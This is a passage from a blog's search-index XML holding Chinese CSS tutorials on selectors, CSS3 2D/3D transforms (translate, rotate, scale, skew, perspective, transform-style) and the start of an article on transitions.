red&#125;</code></pre><p>假如p标签父元素是body，就表示为body的第二个子元素设置样式。</p><h2 id="组选择器"><a href="#组选择器" class="headerlink" title="组选择器 "></a>组选择器 <span id="2.9"></h2><p>为多个元素设置相同样式时，可以使用<strong>逗号</strong>分隔元素，达到同时设置的效果。例如：</p><pre><code>p1,p1 &#123;color: red&#125;</code></pre><p>表示为p1和p2 <strong>同时</strong>设置<strong>相同</strong>的样式。</p><h2 id="相邻同级选择器"><a href="#相邻同级选择器" class="headerlink" title="相邻同级选择器 "></a>相邻同级选择器 <span id="2.10"></h2><p>选择与指定元素同级的相邻的第一个某元素，设置样式，例如：</p><pre><code>div+p &#123;color: red&#125;</code></pre><p>表示为 p 设置样式，并且这个 p 与 div 同级，并且是与 div <strong>相邻的第一个</strong> p，div <strong>内部</strong>的 p 并不包含在内。</p><hr><h1 id="返回顶部"><a href="#返回顶部" class="headerlink" title="返回顶部"></a>返回<a href="#home">顶部</a></h1>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css选择器 内联嵌入外部式 ID类选择器区别 伪元素 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS3 之 2D 与 3D 变换</title>
      <link href="/2024/09/27/css/css3-zhi-2d-yu-3d-bian-huan/"/>
      <url>/2024/09/27/css/css3-zhi-2d-yu-3d-bian-huan/</url>
      
        <content type="html"><![CDATA[<h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><hr><ul><li><a href="#%E7%9B%AE%E5%BD%95">目录</a></li><li><a href="#%E5%85%B3%E4%BA%8E%E5%9D%90%E6%A0%87%E8%BD%B4">关于坐标轴</a></li><li><a href="#2d%E5%8F%98%E6%8D%A2">2D变换</a><ul><li><a href="#translatexy">translate(x,y)</a></li><li><a href="#rotatedeg">rotate(deg)</a></li><li><a href="#scalexy">scale(x,y)</a></li><li><a href="#skewxdegydeg">skew(xdeg,ydeg)</a></li><li><a href="#matrixabcde">matrix(a,b,c,d,e)</a></li></ul></li><li><a href="#3d%E5%8F%98%E6%8D%A2">3D变换</a><ul><li><a href="#translate3dxyz">translate3d(x,y,z)</a></li><li><a href="#rotate3dxyzdeg">rotate3d(x,y,z,deg)</a></li><li><a href="#scale3dxyz">scale3d(x,y,z)</a></li><li><a href="#matrix3d">matrix3d()</a></li><li><a href="#perspective">perspective</a></li><li><a href="#perspective-origin">perspective-origin</a></li><li><a href="#backface-visibility">backface-visibility</a></li></ul></li><li><a href="#%E5%85%B6%E4%BB%96%E5%B1%9E%E6%80%A7">其他属性</a><ul><li><a href="#transform-origin">transform-origin</a></li><li><a href="#transform-style">transform-style</a></li><li><a href="#css-3d">CSS 3D</a></li></ul></li></ul><hr><p>css3实现了对元素执行2D平面变换，以及视觉上的3D空间变换，2D变换平时可能用的较多，3D效果也能锦上添花；</p><h1 id="关于坐标轴"><a href="#关于坐标轴" class="headerlink" title="关于坐标轴"></a>关于坐标轴</h1><p>初中数学的几何学里我们便开始接触坐标轴，最基本的是平面直角坐标系<code>XoY</code>，然后延伸出空间直角坐标系<code>XYZ</code>，现在我们来说一下css中的坐标系；</p><p>css甚至一下设备相关的开发中，基本都遵循这样一套坐标系：以手机屏幕为例，坐标系<strong>圆点</strong>位于屏幕最左上角；<strong>x轴</strong>水平，向右为正方向；<strong>y轴</strong>垂直，向下为正方向；<strong>z轴</strong>垂直于整个屏幕平面，向外为正方向，就是屏幕光线射向你眼睛的方向；</p><p>如图：</p><p><img src="https://i.loli.net/2019/01/26/5c4c05d7bfbf0.png" alt="image"></p><h1 id="2D变换"><a href="#2D变换" class="headerlink" title="2D变换"></a>2D变换</h1><p>包括平移<code>translate()</code>，旋转<code>rotate()</code>，缩放<code>scale()</code>，倾斜<code>skew()</code>，矩阵<code>matrix()</code>；</p><h2 id="translate-x-y"><a href="#translate-x-y" class="headerlink" title="translate(x,y)"></a>translate(x,y)</h2><p>平移操作，包括<code>translateX(x)</code>, <code>translateY(y)</code>，括号内填平移参数值，可以是负值，即反方向；</p><p>例如：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/*元素向右平移50px，向下移60px*/</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translateX</span><span class="token punctuation">(</span>50px<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translateY</span><span class="token punctuation">(</span>60px<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*简写形式，效果相同*/</span><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translate</span><span class="token punctuation">(</span>50px<span class="token punctuation">,</span> 60px<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意</strong><code>translate()</code>只指定一个值则默认是<strong>x轴</strong>位移，即水平移动；</p><h2 id="rotate-deg"><a href="#rotate-deg" class="headerlink" title="rotate(deg)"></a>rotate(deg)</h2><p>元素旋转，括号中参数为旋转角度，<strong>顺时针</strong>为正值，<strong>逆时针</strong>为负值，单位为<code>deg</code>，即多少度；</p><p>例如：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* 顺时针旋转30° */</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>30deg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/01/26/5c4c1133253ba.png" alt="rotate"></p><h2 id="scale-x-y"><a href="#scale-x-y" class="headerlink" title="scale(x,y)"></a>scale(x,y)</h2><p>缩放元素，参数分别为x轴，y轴缩放倍数，包括<code>scaleX(x)</code>和<code>scaleY(y)</code>，提供一个参数表示<strong>按比例</strong>缩放；</p><p>例如：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* 横向缩小一半，纵向放大一倍 */</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scale</span><span class="token punctuation">(</span>.5<span class="token punctuation">,</span> 2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/01/26/5c4c11e1729ad.png" alt="scale1"></p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* 按比例放大3倍 */</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scale</span><span class="token punctuation">(</span>3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/01/26/5c4c11e1b4e89.png" alt="scale2"></p><h2 id="skew-xdeg-ydeg"><a href="#skew-xdeg-ydeg" class="headerlink" title="skew(xdeg,ydeg)"></a>skew(xdeg,ydeg)</h2><p>包含<code>skewX(deg)</code>, <code>skewY(deg)</code>，表示在水平和垂直方向倾斜的角度；</p><p>例如：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">skewX</span><span class="token punctuation">(</span>30deg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">skewY</span><span class="token punctuation">(</span>45deg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* 简写 */</span><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">skew</span><span class="token punctuation">(</span>30deg<span class="token punctuation">,</span> 45deg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要<strong>注意</strong>，如果元素为一个矩形，那么<code>skewX(30deg)</code>表示矩形<strong>顶边固定</strong>，底边<strong>向右</strong>倾斜<code>30deg</code>；<code>skewY(30deg)</code>表示矩形<strong>左边框固定</strong>，右边框<strong>向下</strong>倾斜<code>30deg</code>；</p><p>可以根据上面讲的屏幕坐标系来记忆，x轴位于屏幕顶部，方向向右；y轴位于屏幕左部，方向向下；</p><p>如果<code>skew()</code>只指定一个值，默认是<strong>水平倾斜</strong>；</p><p><strong>skewX(30deg)</strong> 的效果：</p><p><img src="https://i.loli.net/2019/01/26/5c4c0fc60c6bd.png" alt="skewX"></p><p><strong>skewY(30deg)</strong> 的效果：</p><p><img src="https://i.loli.net/2019/01/26/5c4c10c4b187a.png" alt="skewY"></p><h2 id="matrix-a-b-c-d-e"><a href="#matrix-a-b-c-d-e" class="headerlink" title="matrix(a,b,c,d,e)"></a>matrix(a,b,c,d,e)</h2><p>这是一个综合属性，之前的平移，缩放，旋转，倾斜都能通过这个矩阵函数实现，对，大学里<strong>线性代数</strong>中的矩阵 T_T；</p><p>其实这个函数就是前面四种操作的<strong>原理</strong>，函数共有六个参数，四种操作都对应不同的参数改变方式，像我们这种非数学专业的就不赘述原理了，前面的操作基本够用了(想寻找刺激就去百度“css matrix”吧)~~;</p><h1 id="3D变换"><a href="#3D变换" class="headerlink" title="3D变换"></a>3D变换</h1><p>所谓3D就是在前面2D平面上多了一个<strong>z轴</strong>，方法名也差不多，然后能以分别以三根轴位基准进行变换，实现立体效果；</p><p>看一下所有3D操作方法：</p><h2 id="translate3d-x-y-z"><a href="#translate3d-x-y-z" class="headerlink" title="translate3d(x,y,z)"></a>translate3d(x,y,z)</h2><p>结合前面讲的空间坐标系和 x, y, z轴的位置，三个参数分别对应元素在三个坐标轴方向的平移值，也包含三个方法<code>translateX(x)</code>, <code>translateY(y)</code>, <code>translateZ(z)</code>；</p><p>举例：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translateX</span><span class="token punctuation">(</span>50px<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translateY</span><span class="token punctuation">(</span>60px<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translateZ</span><span class="token punctuation">(</span>70px<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* 简写 */</span><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translate3d</span><span class="token punctuation">(</span>50px<span class="token punctuation">,</span> 60px<span class="token punctuation">,</span> 70px<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注意：</strong> 关于设置 <code>translateZ(z)</code> 看不出效果的问题，后面说到设置<code>persoective</code>时会解释；</p><h2 id="rotate3d-x-y-z-deg"><a href="#rotate3d-x-y-z-deg" class="headerlink" title="rotate3d(x,y,z,deg)"></a>rotate3d(x,y,z,deg)</h2><p>参数<code>x, y, z</code>为空间坐标系的一个坐标位置，然后由原点<code>(0, 0, 0)</code>指向这个点形成一个有方向的新轴，数学中称矢量，最后一个参数就是元素围绕刚才所形成的新轴旋转的度数；</p><p>也包括 <code>rotateX(deg)</code>, <code>rotateY(deg)</code>, <code>rotateZ(deg)</code>，之前2D的 <code>rotate()</code> 便是这里的 <code>rotateZ()</code>；</p><p>至于旋转的方向，判断方法类似于物理中的<strong>左手定则</strong>：角度指定为正的话，左手拇指与四指垂直，拇指指向元素围绕旋转的坐标轴或自定义轴，四指弯曲围绕方向就是旋转方向；</p><p>举例：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotateX</span><span class="token punctuation">(</span>30deg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotateY</span><span class="token punctuation">(</span>30deg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotataZ</span><span class="token punctuation">(</span>30deg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* 自定义轴旋转 */</span><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate3d</span><span class="token punctuation">(</span>10<span class="token punctuation">,</span> 10<span class="token punctuation">,</span> 10<span class="token punctuation">,</span> 30deg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>rotateX(30deg)</strong> 的效果：</p><p><img src="https://i.loli.net/2019/01/26/5c4c13d0c4eef.png" alt="rotateX"></p><p><strong>rotateY(30deg)</strong> 的效果：</p><p><img src="https://i.loli.net/2019/01/26/5c4c142489a1d.png" alt="rotateY"></p><p>关于为什么这里的旋转不是想象中的效果，而是缩小，主要是没有设置视点，后面会讲；</p><h2 id="scale3d-x-y-z"><a href="#scale3d-x-y-z" class="headerlink" title="scale3d(x,y,z)"></a>scale3d(x,y,z)</h2><p>元素关于三个轴的缩放比例，包括<code>scaleX(x)</code>, <code>scaleY(y)</code>, <code>scaleZ(z)</code>，举例：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scaleX</span><span class="token punctuation">(</span>2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scaleY</span><span class="token punctuation">(</span>2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scaleZ</span><span class="token punctuation">(</span>2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* 简写 */</span><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scale3d</span><span class="token punctuation">(</span>2<span class="token punctuation">,</span> 2<span class="token punctuation">,</span> 2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要<strong>注意</strong>这里的<code>scaleZ()</code>，正常情况下，扩大z轴会是物体<strong>变厚</strong>，但是css里面呈现的平面元素并没有<strong>厚度</strong>，所以这里的缩放z轴其实是缩放元素在z轴的<strong>坐标</strong>，所以要有效果必须要指定<code>translateZ()</code>的值；</p><p>举例：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">body</span> <span class="token punctuation">&#123;</span>    <span class="token property">perspective</span><span class="token punctuation">:</span> 500<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* 必须这个顺序，先缩放后平移，不然无效果 */</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">scaleZ</span><span class="token punctuation">(</span>2<span class="token punctuation">)</span> <span class="token function">translateZ</span><span class="token punctuation">(</span>100px<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/01/26/5c4c17ef48ae2.png" alt="scaleZ"></p><p>按照上面样式才能看到<code>scaleZ(2)</code>的效果，因为后面在z轴上移动了<code>100px</code>，缩放比例为2，最终会移动<code>200px</code>，屏幕上则表现为元素放大了一下，这是透视效果，就是那个 <code>perspective</code> 值，下面会讲到；</p><h2 id="matrix3d"><a href="#matrix3d" class="headerlink" title="matrix3d()"></a>matrix3d()</h2><p>和前面2D的<code>matrix()</code>相似，只不过这里括号里的参数有<strong>16个</strong>，矩阵更加复杂，跳过吧﹋o﹋，有兴趣可以自行百度~~；</p><h2 id="perspective"><a href="#perspective" class="headerlink" title="perspective"></a>perspective</h2><p>在上面的示例中，有关z轴的平移和缩放通常情况下是看不出效果的，正是缺少这项属性值，叫做 <strong>透视</strong>，美术或设计中会出现这个词汇，就是实现物体近大远小的效果，远小最终会小到一个点，那就是 <strong>透视点</strong>，<code>perspective</code>就是用来设置那个点距离元素有多远，一般300~600很体现很好的透视效果，<strong>值越小元素透视变形越严重</strong>；</p><p>需要<strong>注意</strong>的是，这项属性设置在应用透视效果元素的<strong>父元素</strong>的样式中，才能看出效果，例如：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">body</span> <span class="token punctuation">&#123;</span>    <span class="token property">perspective</span><span class="token punctuation">:</span> 500<span class="token punctuation">;</span>    <span class="token comment">/* 考虑浏览器兼容 */</span>    <span class="token property">-webkit-perspective</span><span class="token punctuation">:</span> 500<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以设置在元素本身，格式为：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">perspective</span><span class="token punctuation">(</span>500<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">-webkit-transform</span><span class="token punctuation">:</span> <span class="token function">perspective</span><span class="token punctuation">(</span>500<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>rotateX(45deg)</strong> 的更真实的效果：</p><p><img src="https://i.loli.net/2019/01/26/5c4c1929babb1.png" alt="rotateX"></p><p><strong>rotateY(45deg)</strong> 的效果：</p><p><img src="https://i.loli.net/2019/01/26/5c4c19c45bbb4.png" alt="rotateY"></p><h2 id="perspective-origin"><a href="#perspective-origin" class="headerlink" title="perspective-origin"></a>perspective-origin</h2><p>此项设置透视点的位置，默认在元素几何中心，需要设置的话，格式如下：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">body</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* 默认中心 */</span>    <span class="token property">perspective-origin</span><span class="token punctuation">:</span> center center<span class="token punctuation">;</span>    <span class="token comment">/* 左上角 */</span>    <span class="token property">perspective-origin</span><span class="token punctuation">:</span> left top<span class="token punctuation">;</span>    <span class="token comment">/* 右边中心 */</span>    <span class="token property">perspective-origin</span><span class="token punctuation">:</span> right center<span class="token punctuation">;</span>    <span class="token comment">/* 底部中心 */</span>    <span class="token property">perspective-origin</span><span class="token punctuation">:</span> bottom center<span class="token punctuation">;</span>    <span class="token comment">/* 也可以是长度 */</span>    <span class="token property">perspective-origin</span><span class="token punctuation">:</span> 30px 40px<span class="token punctuation">;</span>    <span class="token comment">/*最后记得加 -webkit- 兼容 */</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>perspective-origin: left center</strong> 的效果：</p><p><img src="https://i.loli.net/2019/01/26/5c4c1c4ab6feb.png" alt="lc"></p><p><strong>perspective-origin: right center</strong> 的效果：</p><p><img src="https://i.loli.net/2019/01/26/5c4c1c4a7c0bf.png" alt="rc"></p><h2 id="backface-visibility"><a href="#backface-visibility" class="headerlink" title="backface-visibility"></a>backface-visibility</h2><p>翻译过来叫背面是否可见，可以设置<code>visible</code>和<code>hidden</code>，默认可见，比如元素正面有文字，设置背面可见，则关于y轴旋转180°后元素内文字变成镜像，否则不会出现；</p><p><strong>backface-visibility: visible</strong> 的效果：</p><p><img src="https://i.loli.net/2019/01/26/5c4c1d8b0651d.png" alt="vi"></p><p><strong>backface-visibility: hidden</strong> 的效果(有旋转，只是背面不可见，则看不见了)：</p><p><img src="https://i.loli.net/2019/01/26/5c4c1e297689d.png" alt="hi"></p><h1 id="其他属性"><a href="#其他属性" class="headerlink" title="其他属性"></a>其他属性</h1><h2 id="transform-origin"><a href="#transform-origin" class="headerlink" title="transform-origin"></a>transform-origin</h2><p>设置2D/3D变化的基准，可以是长度值，也可以是 <code>left, right, top, bottom</code>，例如：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">div</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/* 关于元素左上角旋转 */</span>    <span class="token property">transform-origin</span><span class="token punctuation">:</span> left top<span class="token punctuation">;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">rotate</span><span class="token punctuation">(</span>30deg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/01/26/5c4c1ed5f21a6.png" alt="lt"></p><h2 id="transform-style"><a href="#transform-style" class="headerlink" title="transform-style"></a>transform-style</h2><p>设置元素如何在3D空间呈现被嵌套的元素，选择是 <code>flat</code> 和 <code>preserve-3d</code>，默认<code>flat</code>；</p><p>这里这么来理解，之前我们对一个元素执行变换时，都是以屏幕所在平面的坐标系在变换，但是元素如果存在子元素的话，<code>transform-style</code>就是用来确定在哪套坐标系上进行变换，<code>flat</code>表示任然以屏幕坐标系为基准，<code>preserve-3d</code>表示以<strong>变换后的父元素所在平面的坐标系</strong>为基准；</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">#parent</span> <span class="token punctuation">&#123;</span>    <span class="token property">transform-style</span><span class="token punctuation">:</span> preserve-3d<span class="token punctuation">;</span>    <span class="token property">-webkit-transform-style</span><span class="token punctuation">:</span> preserve-3d<span class="token punctuation">;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">perspective</span><span class="token punctuation">(</span>500<span class="token punctuation">)</span> <span class="token function">rotateY</span><span class="token punctuation">(</span>45deg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">-webkit-transform</span><span class="token punctuation">:</span> <span class="token function">perspective</span><span class="token punctuation">(</span>500<span class="token punctuation">)</span> <span class="token function">rotateY</span><span class="token punctuation">(</span>45deg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">#child</span> <span class="token punctuation">&#123;</span>    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">perspective</span><span class="token punctuation">(</span>500<span class="token punctuation">)</span> <span class="token function">rotateX</span><span class="token punctuation">(</span>45deg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">-webkit-transform</span><span class="token punctuation">:</span> <span class="token function">perspective</span><span class="token punctuation">(</span>500<span class="token punctuation">)</span> <span class="token function">rotateX</span><span class="token punctuation">(</span>45deg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>flat</strong> 的效果：</p><p><img src="https://i.loli.net/2019/01/26/5c4c238db14da.png" alt="flat"></p><p><strong>preserve-3d</strong> 的效果：</p><p><img src="https://i.loli.net/2019/01/26/5c4c238dc1ae1.png" alt="pre"></p><p>例如，父元素绕x轴旋转了45度，并且设置<code>transform-style: preserve-3d</code>，而嵌套的子元素只绕y轴旋转45度，那么最终效果就是子元素绕父元素平面的y轴旋转了45度，看起来就像先x轴转45度后y轴转45度的效果；</p><p>最后，别忘了为以上所有特性添加浏览器兼容前缀；</p><p>顺便附上一个以上功能综合效果的演示页面，请戳下面：</p><h2 id="CSS-3D"><a href="#CSS-3D" class="headerlink" title="CSS 3D"></a><a href="http://huangqiyun.top/css3d/">CSS 3D</a></h2>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css2d css3d transform </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS3 过渡与动画</title>
      <link href="/2024/09/27/css/css3-guo-du-yu-dong-hua/"/>
      <url>/2024/09/27/css/css3-guo-du-yu-dong-hua/</url>
      
        <content type="html"><![CDATA[<p>CSS3中出现很多新的特性，下面就讲一下其中比较好玩的<strong>3D操作</strong>，<strong>过渡</strong>和<strong>动画</strong>效果；</p><h1 id="过渡-transition"><a href="#过渡-transition" class="headerlink" title="过渡(transition)"></a>过渡(transition)</h1><p>过渡就是使瞬间的样式变化，按照一定方式变得缓慢平缓；</p><p>例如鼠标划过超链接时颜色的变化，点击按钮后的颜色变化等，默认转化都是瞬间完成，可能你已经习惯了这种变换，但有时候平缓一些看着还是比较舒适的；</p><p>要实现样式的过渡变化，那么首先就学要有<strong>样式变换</strong>，例如鼠标划过，单击按钮，点击图片等操作，来实现颜色，尺寸，位置等样式的变化；</p><p>下面是鼠标划过段落使文本变红的操作，应用所有 <code>transition</code>属性：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">p:hover</span> <span class="token punctuation">&#123;</span>    <span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">p</span> <span class="token punctuation">&#123;</span>    <span class="token property">transition-property</span><span class="token punctuation">:</span> color<span class="token punctuation">;</span>    <span class="token property">transition-duration</span><span class="token punctuation">:</span> 2s<span class="token punctuation">;</span>    <span class="token property">transition-timing-function</span><span class="token punctuation">:</span> linear<span class="token punctuation">;</span>    <span class="token property">transition-delay</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/01/26/5c4c3488ab322.gif" alt="image"></p><p>一共四个值，功能基本都是字面翻译的意思：</p><ul><li><strong>transition-property</strong></li></ul><p>执行过渡的属性，例子设置为颜色color的变化，也可以是width, font-size等，不设置的话默认是<code>all</code>，即所有属性；</p><ul><li><strong>transition-duration</strong></li></ul><p>过渡的时间，单位是秒，如1s, 2.3s，不设置的话默认 <code>0s</code>，即无过渡效果；</p><ul><li><strong>transition-timing-function</strong></li></ul><p>设置过渡时的变化方式，默认是 <code>ease</code>，即速度由慢到快再到慢，常用的还有 <code>linear</code>，线性变化速度均匀，还有其他几个方式，过渡时间短的话看不出什么区别；</p><ul><li><strong>transition-delay</strong></li></ul><p>延迟时间，即多少秒后执行过渡效果，默认 <code>0s</code>，不延迟；</p><p>当然这么多单词可能记不住，一般使用快捷写法：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">p</span> <span class="token punctuation">&#123;</span>    <span class="token property">transition</span><span class="token punctuation">:</span> color 2s linear 0<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/*最少要指定过渡时间*/</span><span class="token selector">p</span> <span class="token punctuation">&#123;</span>    <span class="token property">transition</span><span class="token punctuation">:</span> 2s<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以设置每个样式分别过渡，例如：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">p</span> <span class="token punctuation">&#123;</span>    <span class="token property">transition</span><span class="token punctuation">:</span> color 2s linear<span class="token punctuation">,</span>                font-size .5s<span class="token punctuation">,</span>                <span class="token property">background</span><span class="token punctuation">:</span> 1s<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每个样式过渡之间用<strong>逗号</strong>隔开就行了；</p><p>最后，由于是新特性，为了兼容性需要加上浏览器厂商前缀：</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">p</span> <span class="token punctuation">&#123;</span>    <span class="token property">transition</span><span class="token punctuation">:</span> 2s<span class="token punctuation">;</span>    <span class="token property">-webkit-transition</span><span class="token punctuation">:</span> 2s<span class="token punctuation">;</span>    <span class="token property">-moz-transition</span><span class="token punctuation">:</span> 2s<span class="token punctuation">;</span>    <span class="token property">-ms-transition</span><span class="token punctuation">:</span> 2s<span class="token punctuation">;</span>    <span class="token property">-o-transition</span><span class="token punctuation">:</span> 2s<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="动画-animation"><a href="#动画-animation" class="headerlink" 